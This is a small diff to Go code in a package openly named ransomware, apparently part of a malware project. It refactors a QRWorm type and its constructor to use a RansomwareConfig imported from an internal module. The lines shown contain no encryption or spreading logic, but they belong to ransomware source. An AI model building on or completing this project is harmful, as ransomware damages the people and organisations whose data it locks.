@@ -1,5 +1,7 @@
 package ransomware
 
+import rw "github.com/ruby570bocadito/x404x/internal/ransomware"
+
 import (
 	"bytes"
 	"crypto/rand"
@@ -17,7 +19,7 @@ import (
 )
 
 type QRWorm struct {
-	config    *RansomwareConfig
+	config    *rw.RansomwareConfig
 	qrPath    string
 	moduleSize int
 	capacity   int
@@ -29,7 +31,7 @@ type QRCode struct {
 	Version int
 }
 
-func NewQRWorm(cfg *RansomwareConfig) *QRWorm {
+func NewQRWorm(cfg *rw.RansomwareConfig) *QRWorm {
 	return &QRWorm{
 		config:     cfg,
 		moduleSize: 4,
